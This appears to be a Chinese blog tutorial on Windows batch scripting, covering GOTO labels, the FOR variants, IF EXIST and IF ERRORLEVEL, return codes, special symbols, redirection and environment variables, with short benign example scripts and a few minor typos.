+<p><strong>将 cmd.exe 导向到<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F/2192936">批处理程序</a>中带标签的行。</strong></p>
+<p><strong>GOTO label</strong></p>
+<p><strong>label 指定批处理程序中用作标签的文字字符串。</strong></p>
+<p>**<br>**　　</p>
+<p><strong>标签必须单独一行，并且以冒号打头。</strong></p>
+<p><strong>如果命令扩展名被启用，GOTO 会如下改变:</strong></p>
+<p><strong>GOTO 命令现在接受目标标签 :EOF，这个标签将控制转移到当前</strong></p>
+<p><strong>批脚本文件的结尾。不定义就退出批脚本文件，这是一个容易的</strong></p>
+<p><strong>办法。有关能使该功能有用的 CALL 命令的扩展名描述，请键入</strong></p>
+<p><strong>CALL &#x2F;?。</strong></p>
+<p>label是什么?这可不是命令label,它指的是标签,标签是啥?见例子**<br>**　　</p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>set &#x2F;p pw&#x3D;请输入密码:</em></p>
+<p><em>if “%pw%”&#x3D;&#x3D;”bathome” goto yes</em></p>
+<p><em>goto :eof</em></p>
+<p><em>rem 未定义的:eof会退出脚本文件</em></p>
+<p><em>:yes</em></p>
+<p><em>echo 密码正确!</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>这是一个更加完整的密码判断,仔细阅读并执行这行代码,现在你知道标签是什么了吗,没错,那个:yes就是标签了!</p>
+<p>标签的格式</p>
+<p>:标签名</p>
+<p>关掉回显以后你有没有发现什么?没错,标签所在的那一行没有被执行,这就是为什么::比rem更快的原因了,但是标签不能被使用在一个语句的内部,主要就是被括号括起来的语句(是的,被括号括起来的语句被看作一个整体),因此::的兼容性没有rem那么好</p>
+<p>附:”::”其实就是不规范的标签名…</p>
+<p>FOR</p>
+<p><strong>1.FOR</strong></p>
+<p><strong>对一组文件中的每一个文件执行某个特定命令。</strong></p>
+<p><strong>FOR%variableIN (set) DO command [command-parameters]</strong></p>
+<p><strong>%variable 指定一个单一字母可替换的参数。</strong></p>
+<p><strong>(set) 指定一个或一组文件。可以使用通配符。</strong></p>
+<p><strong>command 指定对每个文件执行的命令。</strong></p>
+<p><strong>command-parameters</strong></p>
+<p><strong>为特定命令指定参数或命令行开关。</strong></p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>for %%i in (*.txt) do echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>这段代码会显示当前文件夹下所有的txt文件</p>
+<p><em>@echo off</em></p>
+<p><em>for %%i in (菜 芽 小 公 公) do echo %%i</em></p>
+<p><em>pause&gt;nul</em><br>　　这段代码会显示</p>
+<p>菜</p>
+<p>芽</p>
+<p>小</p>
+<p>公</p>
+<p>公</p>
+<p>注:%%i为for输出专用变量格式,其中i可以是a&#x2F;A&#x2F;0-z&#x2F;Z&#x2F;9和一些符号什么的(如! # 不过不建议使用),在cmd中只能用一个%</p>
+<p><strong>2.FOR &#x2F;L</strong></p>
+<p><strong>FOR &#x2F;L %variable IN (start,step,end) DO command [command-parameters]</strong></p>
+<p><strong>该集表示以增量形式从开始到结束的一个数字序列。</strong></p>
+<p><strong>因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生</strong></p>
+<p><strong>序列 (5 4 3 2 1)。</strong></p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>for &#x2F;L %%a in (1 2 1000) do echo %%a<br>　　pause&gt;nul</em></p>
+<p>这个用法很简单,没有什么要讲解的,从这段代码主要是看出了逗号可以省略.当然还有一些稀奇古怪的用法为了防止新手弄混在这里就不讲解了</p>
+<p><strong>3.FOR &#x2F;R</strong></p>
+<p><strong>FOR &#x2F;R [[drive:]path] %variable IN (set) DO command [command-parameters]</strong></p>
+<p><strong>检查以 [drive:]path 为根的目录树，指向每个目录中的</strong></p>
+<p><strong>FOR 语句。如果在 &#x2F;R 后没有指定目录，则使用当前</strong></p>
+<p><strong>目录。如果集仅为一个单点(.)字符，则枚举该目录树。</strong></p>
+<p>**<br>**　　 这个命令同样有一些看起来很奇怪的用法,为了防止新手迷糊就只讲解基础的</p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>for &#x2F;r C:\Windwos\system32 %%i in (*) do echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>这段代码枚举了C:\Windows\system32下所有的文件,包括子文件夹里的</p>
+<p><strong>4.FOR &#x2F;D</strong></p>
+<p><strong>FOR &#x2F;D %variable IN (set) DO command [command-parameters]</strong></p>
+<p><strong>如果集中包含通配符，则指定与目录名匹配，而不与文件</strong></p>
+<p><strong>名匹配。</strong></p>
+<p>这个命令的用法和上面差不多,只不过是枚举目录名,不详解了</p>
+<p><strong>5.FOR &#x2F;F</strong></p>
+<p>for &#x2F;f是一个非(丧)常(心)复(病)杂(狂)的命令…</p>
+<p>让我们从它的第一个用法来讲:</p>
+<p><strong>FOR &#x2F;F [“options”] %variable IN (file-set) DO command [command-parame</strong></p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p>*echo 1,1 2,1 3,1 4,1&gt;&gt;test.txt<br>*　　</p>
+<p><em>echo A1,2 2,2 3,2 4,2&gt;&gt;test.txt</em></p>
+<p><em>echo 1,3 2,3 3,3 4,3&gt;&gt;test.txt</em></p>
+<p><em>echo A1,4 2,4 3,4 4,4&gt;&gt;test.txt</em></p>
+<p><em>rem 以上代码在当前文件夹下生成了一个test.txt,打开看看?</em></p>
+<p><em>For &#x2F;F %%i In (test.txt) Do Echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p><em>For &#x2F;F “tokens&#x3D;2” %%i In (test.txt) Do Echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p><em>For &#x2F;F “tokens&#x3D;3” %%i In (test.txt) Do Echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p><em>For &#x2F;F “tokens&#x3D;4” %%i In (test.txt) Do Echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>我想执行完这个bat,再分析一下结果和代码,聪明的你一定了解了tokens的用处</p>
+<p>for &#x2F;f 默认以空格为分隔符,将每一行分割为几个元素,而tokens就表示取第几个元素.但假如我们要取的不是一个元素呢?需要全部显示出来怎么办?</p>
+<p>tokens&#x3D;* 表示取所有元素,用%%i输出</p>
+<p>tokens&#x3D;1,2,3,4或tokens&#x3D;1-4 然后用%%i或%%i,%%j,%%k,%%l 输出</p>
+<p>其实我们还有其他的方法,比如请出delims参数</p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p><em>rem test.txt已经有了,就不生成了</em></p>
+<p><em>for &#x2F;f “delims&#x3D;*“ %%i in (test.txt) do echo %%i</em></p>
+<p><em>pause&gt;nul</em></p>
+<p>delims是个啥玩意儿?其实这就是分割符的设定,默认以空格为分隔符,你可以将分隔符设置成其他的,你的文本就不会被分割了,delims同样支持多个分隔符,格式delims&#x3D;第一个分隔符,第二个分隔符,第三个分隔符</p>
+<p>啊哈,还有一个skip和eol,skip表示忽略前几行,比如skip&#x3D;10表示忽略这个文本的前十行,我这个文本只有4行,如果你加上skip&#x3D;10的话就什么都不会输出了</p>
+<p>eol表示忽略以某个符号开头的行,比如eol&#x3D;A,当某一行的开头是A的时候,这一行就不会被处理,不过支持设置一个符号</p>
+<p>for &#x2F;f同也可以处理字符串</p>
+<p><strong>FOR &#x2F;F [“options”] %variable IN (“string”) DO command [command-parameters]</strong></p>
+<p>字符串需要用双引号引起来,其余用法一样,不过这里就要讲到usebackq参数了,for &#x2F;f是支持处理多个文件的,文件直接用空格隔开(某些符号也可以),假如文件名中含有空格怎么办呢?那好像只能用双引号引起来了,但是用双引号引起来会被识别成字符串的,这时就要请出usebackq参数了,加上这个参数,带引号的字符串也会被识别为文件~</p>
+<p><strong>FOR &#x2F;F [“options”] %variable IN (‘command’) DO command [command-parameters]</strong></p>
+<p>用for &#x2F;f来处理命令执行的结果,命令要用单引号引起来</p>
+<p>例:</p>
+<p><em>@echo off</em></p>
+<p>*for &#x2F;f “skip&#x3D;3” %%i in (‘tasklist’) do echo;%%i<br>*　　</p>
+<p><em>pause&gt;nul</em></p>
+<p>这段代码就处理了命令ipconfig的执行结果,单独键入tasklist看会出现什么?</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>~I - 删除任何引号(“)，扩充 %I</p>
+<p>%~fI - 将 %I 扩充到一个完全合格的路径名</p>
+<p>%~dI - 仅将 %I 扩充到一个驱动器号</p>
+<p>%~pI - 仅将 %I 扩充到一个路径</p>
+<p>%~nI - 仅将 %I 扩充到一个文件名</p>
+<p>%~xI - 仅将 %I 扩充到一个文件扩展名</p>
+<p>%~sI - 扩充的路径只含有短名</p>
+<p>%~aI - 将 %I 扩充到文件的文件属性</p>
+<p>%~tI - 将 %I 扩充到文件的日期&#x2F;时间</p>
+<p>%~zI - 将 %I 扩充到文件的大小</p>
+<p>%~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩充</p>
+<p>到找到的第一个完全合格的名称。如果环境变量名</p>
+<p>未被定义，或者没有找到文件，此组合键会扩充到</p>
+<p>空字符串</p>
+<p>组合修饰符来得到多重结果:</p>
+<p>%~dpI - 仅将 %I 扩充到一个驱动器号和路径</p>
+<p>%~nxI - 仅将 %I 扩充到一个文件名和扩展名</p>
+<p>%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名</p>
+<p>%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充</p>
+<p>到找到的第一个驱动器号和路径。</p>
+<p>%~ftzaI - 将 %I 扩充到类似输出线路的 DIR</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>这些不多说了,自己用for &#x2F;r命令输出的时候把%%i改成%%~nxi之类的试一试就理解了</p>
+<p>批处理示例</p>
+<p>\1. IF-EXIST</p>
+<ol>
+<li></li>
+</ol>
+<p>首先用记事本在C:\建立一个test1<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>，文件内容如下：</p>
+<p>@echo off</p>
+<p>IF EXIST \AUTOEXEC.BAT TYPE \AUTOEXEC.BAT</p>
+<p>IF NOT EXIST \AUTOEXEC.BAT ECHO \AUTOEXEC.BAT does not exist</p>
+<p>然后运行它：</p>
+<p>C:&gt;TEST1.BAT</p>
+<p>如果C:\存在AUTOEXEC.BAT文件，那么它的内容就会被显示出来，如果不存在，批处理就会提示你该文件不存在。</p>
+<ol start="2">
+<li></li>
+</ol>
+<p>接着再建立一个test2.<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/bat%E6%96%87%E4%BB%B6">bat文件</a>，内容如下：</p>
+<p>@ECHO OFF</p>
+<p>IF EXIST %1 TYPE %1</p>
+<p>IF NOT EXIST %1 ECHO %1 does not exist</p>
+<p>执行:</p>
+<p>C:&gt;TEST2 AUTOEXEC.BAT</p>
+<p>该命令运行结果同上。</p>
+<p>说明：</p>
+<p>(1) IF EXIST 是用来测试文件是否存在的，格式为</p>
+<p>IF EXIST [路径+文件名] 命令</p>
+<p>(2) test2.<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/bat%E6%96%87%E4%BB%B6">bat文件</a>中的%1是参数，DOS允许传递9个批参数信息给<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>，分别为%1~%9(%0表示test2命令本身) ，这有点象编程中的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%9E%E5%8F%82">实参</a>和形参的关系，%1是形参，AUTOEXEC.BAT是实参。</p>
+<ol start="3">
+<li>更进一步的，建立一个名为TEST3.BAT的文件，内容如下：</li>
+</ol>
+<p>@echo off</p>
+<p>IF “%1” &#x3D;&#x3D; “A” ECHO XIAO</p>
+<p>IF “%2” &#x3D;&#x3D; “B” ECHO TIAN</p>
+<p>IF “%3” &#x3D;&#x3D; “C” ECHO XIN</p>
+<p>如果运行：</p>
+<p>C:&gt;TEST3 A B C</p>
+<p>屏幕上会显示:</p>
+<p>XIAO</p>
+<p>TIAN</p>
+<p>XIN</p>
+<p>如果运行：</p>
+<p>C:&gt;TEST3 A B</p>
+<p>屏幕上会显示</p>
+<p>XIAO</p>
+<p>TIAN</p>
+<p>在这个命令执行过程中，DOS会将一个空字符串指定给参数%3。</p>
+<p>2、IF-ERRORLEVEL</p>
+<p>建立TEST4.BAT，内容如下：</p>
+<p>@ECHO OFF</p>
+<p>XCOPY C:\AUTOEXEC.BAT D:IF ERRORLEVEL 1 ECHO 文件拷贝失败</p>
+<p>IF ERRORLEVEL 0 ECHO 成功拷贝文件</p>
+<p>然后执行文件:</p>
+<p>C:&gt;TEST4</p>
+<p>如果文件拷贝成功，屏幕就会显示“成功拷贝文件”，否则就会显示“文件拷贝失败”。</p>
+<p>IF ERRORLEVEL 是用来测试它的上一个DOS命令的返回值的，注意只是上一个命令的返回值，而且返回值必须依照从大到小次序顺序判断。因此下面的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>是错误的：</p>
+<p>@ECHO OFF</p>
+<p>XCOPY C:\AUTOEXEC.BAT D:\</p>
+<p>IF ERRORLEVEL 0 ECHO 成功拷贝文件</p>
+<p>IF ERRORLEVEL 1 ECHO 未找到拷贝文件</p>
+<p>IF ERRORLEVEL 2 ECHO 用户通过ctrl-c中止拷贝操作</p>
+<p>IF ERRORLEVEL 3 ECHO 预置错误阻止文件拷贝操作</p>
+<p>IF ERRORLEVEL 4 ECHO 拷贝过程中写盘错误</p>
+<p>无论拷贝是否成功，后面的：</p>
+<p>未找到拷贝文件</p>
+<p>用户通过ctrl-c中止拷贝操作</p>
+<p>预置错误阻止文件拷贝操作</p>
+<p>拷贝过程中写盘错误</p>
+<p>都将显示出来。</p>
+<h2 id="命令返回值"><a href="#命令返回值" class="headerlink" title="命令返回值"></a>命令返回值</h2><p>backup</p>
+<p>0 备份成功</p>
+<p>1 未找到备份文件</p>
+<p>2 文件共享冲突阻止备份完成</p>
+<p>3 用户用ctrl-c中止备份</p>
+<p>4 由于致命的错误使备份操作中止</p>
+<p>diskcomp</p>
+<p>0 盘比较相同</p>
+<p>1 盘比较不同</p>
+<p>2 用户通过ctrl-c中止比较操作</p>
+<p>3 由于致命的错误使比较操作中止</p>
+<p>4 预置错误中止比较</p>
+<p>diskcopy</p>
+<p>0 盘拷贝操作成功</p>
+<p>1 非致命盘读&#x2F;写错</p>
+<p>2 用户通过ctrl-c结束拷贝操作</p>
+<p>3 因致命的处理错误使盘拷贝中止</p>
+<p>4 预置错误阻止拷贝操作</p>
+<p>format</p>
+<p>0 格式化成功</p>
+<p>3 用户通过ctrl-c中止格式化处理</p>
+<p>4 因致命的处理错误使格式化中止</p>
+<p>5 在提示“proceed with format（y&#x2F;n）?”下用户键入n结束</p>
+<p>xcopy</p>
+<p>0 成功拷贝文件</p>
+<p>1 未找到拷贝文件</p>
+<p>2 用户通过ctrl-c中止拷贝操作</p>
+<p>4 预置错误阻止文件拷贝操作</p>
+<p>5 拷贝过程中写盘错误</p>
+<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p>@-隐藏命令</p>
+<p>开启了echo off能够起到隐藏命令的效果,而@同样能起到这个效果,只不过需要在每条命令前面都加一个…</p>
+<p>&amp;&amp;,||-判断</p>
+<p>还记得用if errorlevel来判断命令成功与否吗?&amp;&amp;和||同样能起到这个效果,&amp;&amp;表示前面的命令成功以后执行后面的命令,||反之</p>
+<p>例:</p>
+<p>@echo;&gt;&gt;%SystemRoot%\system32\test.txt&amp;&amp;echo 成功!||echo 失败</p>
+<p>@pause&gt;nul</p>
+<p>|-管道</p>
+<p>将前一个命令执行的结果发送给后一个命令</p>
+<p>例:</p>
+<p>@echo 你好|find “你”</p>
+<p>@tasklist|find “exe”</p>
+<p>&amp;-分行符</p>
+<p>可以把几个命令写在同一行</p>
+<p>例:</p>
+<p>@echo 123&amp;@echo 456</p>
+<p>pause&gt;nul</p>
+<p>^-分行与转义符</p>
+<p><strong>1.分行</strong><br>　　可以把一个命令写成多行哦</p>
+<p>例:</p>
+<p>@echo 1^</p>
+<p>2^</p>
+<p>3^</p>
+<p>4</p>
+<p>@pause&gt;nul</p>
+<p>复制上面的命令,执行结果是什么?这就是分行符的作用</p>
+<p><strong>2.转义</strong></p>
+<p>当我们试图输出一个&amp;的时候,我们会发现输出不了…因为它被当成分行符处理了</p>
+<p>这时就要请出转义符^了,它可以剥夺后面第一个符号的特殊地位,变为普通符号(这其实是一个很神奇的功能,之所以神奇…赘不详述)</p>
+<p>例:</p>
+<p>@echo ^&amp;</p>
+<p>@pause&gt;nul</p>
+<p>这样就输出了&amp;</p>
+<p>另外，当存在a变量（前面set &#x2F;p a&#x3D;或set a&#x3D;给a赋值了）想要输出%a%，一是可以用转义符^，还可以：</p>
+<p>echo %%a%%</p>
+<p>这样既可将两个百分号识别为一个，起到了转义的作用</p>
+<p>还有些特殊情况不需要转义：</p>
+<p>echo “0000|000”</p>
+<p>用引号括起来可以起到一定的转义的作用，包括set “a&#x3D;a的值”等</p>
+<p>但特别特殊的情况比如获取%1时存在转义符很难处理，没办法正常引用</p>
+<p>*,?-通配符</p>
+<p>啥叫通配符?举个例子吧,*.jpg表示所有的jpg,*表示所有文件.现在你明白了吗? 那”?”有什么用,*可以为任意字符,但?只表示一个字符,比如?.jpg只表示文件名只有一个的jpg文件,比如1.jpg,比.jpg什么</p>
+<p>()-括起来</p>
+<p>括起来的语句是一个整体</p>
+<p>&gt;,&gt;&gt;,&lt;-重定向</p>
+<p><strong>在这里请注意: 在重定向符号 “&gt;” 以及 “&gt;&gt;” 前必须添加空格以防万一，因为Batch具有不唯一性所以在很多时候不加空格也能正常使用。但是日常使用中必须添加空格否则失败的几率很大，要么是无法创建&#x2F;输出，要么文件是空的。</strong></p>
+<p><strong>请不要使用不添加空格的不正确用法！</strong></p>
+<p>echo 123 &gt;&gt;one.txt</p>
+<p>可以输出123追加到one.txt中</p>
+<p>echo 123 &gt;one.txt</p>
+<p>可以输出123覆盖one.txt中原先的内容</p>
+<p>nul是一个系统保留字,所以&gt;nul不会输出到任何文件,可以起到隐藏命令执行结果的效果</p>
+<p>2 &gt;nul可以起到隐藏命令失败执行结果的效果</p>
+<p>&lt;可以从文件中读取数据到某个命令中,不过这个命令得等待用户输入</p>
+<p>例:</p>
+<p>@echo off</p>
+<p>echo 123 &gt;&gt;00.txt</p>
+<p>set &#x2F;p num&#x3D;&lt;00.txt</p>
+<p>echo 数字是%num%</p>
+<p>pause&gt;nul</p>
+<p>有些命令不止需要一个&gt;nul，如要连接，需要：&gt;nul 2&gt;nul以此类推</p>
+<p>如果前面有数字，需要添加空格</p>
+<p>ping &gt;nul 2&gt;nul</p>
+<p>&#x3D;1&gt;nul 2&gt;nul ping</p>
+<p>&#x3D;ping &gt;nul 2&gt;&amp;1…. X&gt;&amp;2 X&gt;&amp;2 X&gt;&amp;3等</p>
+<p>nul指空设备，简单来说就是隐藏输出。</p>
+<p>2&gt;&amp;1 3&gt;&amp;2 可以一直接下去，&amp;1 &amp;2就是引用第一个、第二个等</p>
+<h2 id="文件技巧"><a href="#文件技巧" class="headerlink" title="文件技巧"></a>文件技巧</h2><h3 id="文章结构"><a href="#文章结构" class="headerlink" title="文章结构"></a>文章结构</h3><p>\1. 所有内置命令的帮助信息</p>
+<p>2.<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量</a>的概念</p>
+<p>\3. 内置的特殊符号(实际使用中间注意避开)</p>
+<p>\4. 简单<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>概念</p>
+<p>\5. 附件1 tmp.txt</p>
+<p>\6. 附件2 sample<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a></p>
+<p>###########################</p>
+<h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><p>###########################</p>
+<p>ver</p>
+<p>cmd &#x2F;?</p>
+<p>set &#x2F;?</p>
+<p>rem &#x2F;?</p>
+<p>if &#x2F;?</p>
+<p>echo &#x2F;?</p>
+<p>goto &#x2F;?</p>
+<p>for &#x2F;?</p>
+<p>shift &#x2F;?</p>
+<p>call &#x2F;?</p>
+<p>其他需要的常用命令</p>
+<p>type &#x2F;?</p>
+<p>find &#x2F;?</p>
+<p>findstr &#x2F;?</p>
+<p>copy &#x2F;?</p>
+<p>下面将所有上面的帮助输出到一个文件</p>
+<p>echo ver &gt;tmp.txt</p>
+<p>ver &gt;&gt;tmp.txt</p>
+<p>echo cmd &#x2F;? &gt;&gt;tmp.txt</p>
+<p>cmd &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo rem &#x2F;? &gt;&gt;tmp.txt</p>
+<p>rem &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo if &#x2F;? &gt;&gt;tmp.txt</p>
+<p>if &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo goto &#x2F;? &gt;&gt;tmp.txt</p>
+<p>goto &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo for &#x2F;? &gt;&gt;tmp.txt</p>
+<p>for &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo shift &#x2F;? &gt;&gt;tmp.txt</p>
+<p>shift &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo call &#x2F;? &gt;&gt;tmp.txt</p>
+<p>call &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo type &#x2F;? &gt;&gt;tmp.txt</p>
+<p>type &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo find &#x2F;? &gt;&gt;tmp.txt</p>
+<p>find &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo findstr &#x2F;? &gt;&gt;tmp.txt</p>
+<p>findstr &#x2F;? &gt;&gt;tmp.txt</p>
+<p>echo copy &#x2F;? &gt;&gt;tmp.txt</p>
+<p>copy &#x2F;? &gt;&gt;tmp.txt</p>
+<p>type tmp.txt</p>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>C:\Program Files&gt;set</p>
+<p>ALLUSERSPROFILE&#x3D;C:\Documents and Settings\All Users</p>
+<p>CommonProgramFiles&#x3D;C:\Program Files\Common Files</p>
+<p>COMPUTERNAME&#x3D;FIRST</p>
+<p>ComSpec&#x3D;C:\WINNT\system32\cmd.exe</p>
+<p>NUMBER_OF_PROCESSORS&#x3D;1</p>
+<p>OS&#x3D;Windows_NT</p>
+<p>Os2LibPath&#x3D;C:\WINNT\system32\os2\dll;</p>
+<p>Path&#x3D;C:\WINNT\system32;C:\WINNT;C:\WINNT\system32\WBEM</p>
+<p>PATHEXT&#x3D;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</p>
+<p>PROCESSOR_ARCHITECTURE&#x3D;x86</p>
+<p>PROCESSOR_IDENTIFIER&#x3D;x86 Family 6 Model 6 Stepping 5, GenuineIntel</p>
+<p>PROCESSOR_LEVEL&#x3D;6</p>
+<p>PROCESSOR_REVISION&#x3D;0605</p>
+<p>ProgramFiles&#x3D;C:\Program Files</p>
+<p>PROMPT&#x3D;$P$G</p>
+<p>SystemDrive&#x3D;C:</p>
+<p>SystemRoot&#x3D;C:\WINNT</p>
+<p>TEMP&#x3D;C:\WINNT\TEMP</p>
+<p>TMP&#x3D;C:\WINNT\TEMP</p>
+<p>USERPROFILE&#x3D;C:\Documents and Settings\Default User</p>
+<p>windir&#x3D;C:\WINNT</p>
+<p>path: 表示可执行程序的搜索路径. 我的建议是你把你的程序copy 到</p>
+<p>%windir%\system32. 这个目录里面. 一般就可以自动搜索到.</p>
+<p>语法: copy mychenxu.exe %windir%\system32.</p>
+<p>使用点(.) 便于一目了然</p>
+<p>对<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量</a>的引用使用(英文模式,<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%8A%E8%A7%92">半角</a>)双引号</p>
+<p>%windir%变量</p>
+<p>%%windir%% 二次变量引用.</p>
+<p>我们常用的还有</p>
+<p>%temp% 临时文件目录</p>
+<p>%windir% 系统目录</p>
+<p>%errorlevel% 退出代码</p>
+<p>输出文件到临时文件目录里面.这样便于当前目录整洁.</p>
+<p>对有空格的参数. 你应该学会使用双引号(“”) 来表示比如对porgram file文件夹操作</p>
+<p>C:&gt;dir p*</p>
+<p>C:\ 的目录</p>
+<p>2000-09-02 11:47 2,164 PDOS.DEF</p>
+<p>1999-01-03 00:47 <DIR> Program Files</p>
+<p>1 个文件 2,164<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82">字节</a></p>
+<p>1 个目录 1,505,997,824 可用字节</p>
+<p>C:&gt;cd pro*</p>
+<p>C:\Program Files&gt;</p>
+<p>C:&gt;</p>
+<p>C:&gt;cd “Program Files”</p>
+<p>C:\Program Files&gt;</p>
+<h3 id="特殊符号-1"><a href="#特殊符号-1" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>微软里面内置了下列字符不能够在创建的文件名中间使用</p>
+<p>con nul aux \ &#x2F; | || &amp;&amp; ^ &gt; &lt; *</p>
+<p>You can use most characters as variable values, including white space. If you use the special characters &lt;, &gt;, |, &amp;, or ^, you must precede them with the escape character (^) or quotation marks. If you use quotation marks, they are included as part of the value because everything following the equal sign is taken as the value. Consider the following examples:</p>
+<p>(大意: 要么你使用^作为前导<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6">字符</a>表示.或者就只有使用双引号””了)</p>
+<p>To create the variable value new&amp;name, type:</p>
+<p>set varname&#x3D;new^&amp;name</p>
+<p>To create the variable value “new&amp;name”, type:</p>
+<p>set varname&#x3D;”new&amp;name”</p>
+<p>The ampersand (&amp;), pipe (|), and parentheses ( ) are special characters that must be preceded by the escape character (^) or quotation marks when you pass them as arguments.</p>
+<p>find “Pacific Rim” &lt; trade.txt &gt; nwtrade.txt</p>
+<p>IF EXIST filename. (del filename.) ELSE echo filename. missing</p>
+<p>&gt; 创建一个文件</p>
+<p>&gt;&gt; 追加到一个文件后面</p>
+<p>@ 前缀字符.表示执行时本行在cmd里面不显示, 可以使用 echo off关闭显示</p>
+<p>^ 对特殊符号( &gt; &lt; &amp;)的前导字符. 第一个只是显示aaa 第二个输出文件bbb</p>
+<p>echo 123456 ^&gt; aaa</p>
+<p>echo 1231231 &gt; bbb</p>
+<p>() 包含命令</p>
+<p>(echo aa &amp; echo bb)</p>
+<p>, 和空格一样的缺省分隔符号.</p>
+<p>; 注释,表示后面为注释</p>
+<p>: 标号作用</p>
+<p>|<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%AE%A1%E9%81%93%E6%93%8D%E4%BD%9C">管道操作</a></p>
+<p>&amp; Usage：第一条命令 &amp; 第二条命令 [&amp; 第三条命令…]</p>
+<p>用这种方法可以同时执行多条命令，而不管命令是否执行成功</p>
+<p>dir c:*.exe &amp; dir d:*.exe &amp; dir e:*.exe</p>
+<p>&amp;&amp; Usage：第一条命令 &amp;&amp; 第二条命令 [&amp;&amp; 第三条命令…]</p>
+<p>当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令；</p>
+<p>|| Usage：第一条命令 || 第二条命令 [|| 第三条命令…]</p>
+<p>当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令；</p>
+<p>常用语法格式</p>
+<p>IF [NOT] ERRORLEVEL number command para1 para2</p>
+<p>IF [NOT] string1&#x3D;&#x3D;string2 command para1 para2</p>
+<p>IF [NOT] EXIST filename command para1 para2</p>
+<p>IF EXIST filename command para1 para2</p>
+<p>IF NOT EXIST filename command para1 para2</p>
+<p>IF “%1”&#x3D;&#x3D;”” goto END</p>
+<p>IF “%1”&#x3D;&#x3D;”net” goto NET</p>
+<p>IF NOT “%2”&#x3D;&#x3D;”net” goto OTHER</p>
+<p>IF ERRORLEVEL 1 command para1 para2</p>
+<p>IF NOT ERRORLEVEL 1 command para1 para2</p>
+<p>FOR &#x2F;L %%i IN (start,step,end) DO command [command-parameters] %%i</p>
